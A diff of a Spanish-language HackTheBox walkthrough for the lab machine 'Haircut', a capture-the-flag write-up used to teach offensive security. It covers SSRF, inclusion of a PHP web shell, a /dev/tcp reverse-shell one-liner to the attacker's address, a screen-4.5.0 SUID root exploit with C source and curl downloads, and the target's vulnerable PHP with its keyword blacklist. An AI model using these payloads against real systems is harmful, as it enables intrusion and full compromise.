@@ -1,5 +1,8 @@
-10.10.10.24
+# 10.10.10.24
+![Haircut](https://user-images.githubusercontent.com/96772264/208973144-27038fbf-2387-42d5-bdbb-77d8a5a056ad.png)
+
 ------------
+# Part 1: Enumeración
 
 Puertos abiertos 22(shh) y 80(http)
 
@@ -14,11 +17,16 @@ HTTPServer[Ubuntu Linux][nginx/1.10.0 (Ubuntu)], IP[10.10.10.24], Title[HTB Hair
 000025043:   200        19 L     41 W       446 Ch      "exposed"
 ```
 El fuzzing por subdominios no resuelve.
+![haircut1](https://user-images.githubusercontent.com/96772264/208973173-5881514e-4505-4294-ace5-3cb9626e975a.PNG)
 
 **/uploads** -> 403 forbidden
 **/exposed.php**
 
 Hay una web que dice que que así "Pon la dirección de la peluquería que te gustaria visitar. Por ejemplo: http://localhost/test.html"
+![haircut2](https://user-images.githubusercontent.com/96772264/208973183-86102b83-a65a-4140-b60a-4f342f239fcb.PNG)
+
+------------
+# Part 2: SSRF
 
 Hay un panel que pone "http://localhost/test.html" y en un iframe nos muestra una foto.
 Si por curiosidad buscamos "http://10.10.10.24/test.html" sale la misma foto.
@@ -61,9 +69,8 @@ Aun así probando con cualquiera de estos se queda colgado.
 000000150:   200        29 L     96 W       966 Ch      "uploads"
 000002010:   200        19 L     43 W       471 Ch      "'"  
 ```
-
-
-## RFI
+------------
+# Part 3: RFI
 
 Si en vez de apuntar al localhost, apuntamos a nuestro servidor ```sudo python3 -m http.server 80``` -> ```http://10.10.14.16```
 
@@ -85,13 +92,17 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 └─$ curl -s "http://10.10.10.24/uploads/cmd.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.16/443 0>%261'"
 ```
+------------
+# Part 4: En el sistema
 
 Recibimos una shell por el puerto 443.
 
 - Usuarios del Sistema ->  root maria
 - SUIDs -> /usr/bin/screen-4.5.0
 
+Hay un exploit para eso:
 
+1. Crea la librería " ./libhax.so"
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -107,6 +118,8 @@ void dropshell(void){
 ```console
 └─$ gcc -fPIC -shared -ldl -o ./libhax.so ./libhax.c 
 ```
+
+1. Crea el binario rootshell (spawnea una sh manteniendo privilegios, una especie de "bash -p")
 ```c
 #include <stdio.h>
 int main(void){
@@ -120,6 +133,8 @@ int main(void){
 ```console
 └─$ gcc -o ./rootshell ./rootshell.c
 ```
+
+Una vez eso se siguen los pasos del exploit
 ```console
 www-data@haircut:/tmp$ curl http://10.10.14.16/libhax.so -O
 www-data@haircut:/tmp$ curl http://10.10.14.16/rootshell -O
@@ -132,25 +147,23 @@ www-data@haircut:/tmp$ ./rootshell
 root
 ```
 
-
+------------
 # Extra
 
+El código que hacia el curl
 ```php
 <?php
 	if(isset($_POST['formurl'])){
-	echo "<p>Requesting Site...</p>";
-	$userurl=$_POST['formurl'];
-	$naughtyurl=0;
-	$disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']');
-	foreach($disallowed as $naughty){
-		if(strpos($userurl,$naughty) !==false){
-			echo $naughty.' is not a good thing to put in a URL';
-			$naughtyurl=1;
-		}
-	}
-	if($naughtyurl==0){
-		echo shell_exec("curl ".$userurl." 2>&1");
-	}
-	}
+		echo "<p>Requesting Site...</p>";
+		$userurl=$_POST['formurl'];   // $usrurl es lo que pasa el usaurio por el panel.
+		$naughtyurl=0;			// Flag que ve si la url es "sucia"
+		$disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']'); // Caracteres especiales
+		foreach($disallowed as $naughty){ 
+			if(strpos($userurl,$naughty) !==false){   // Si cada uno de esos caracteres sale en la url, no ejecutamos nada.
+				echo $naughty.' is not a good thing to put in a URL';
+				$naughtyurl=1;}}
+		if($naughtyurl==0){    // Si pasa esta vaga sanitización...
+			echo shell_exec("curl ".$userurl." 2>&1");}}    // El sistema le hace un curl
 ?>
 ```
+Lo de los caracteres es para que no se pueda ejecutar comandos tipo ```curl http://localhost/test.html; whoami```
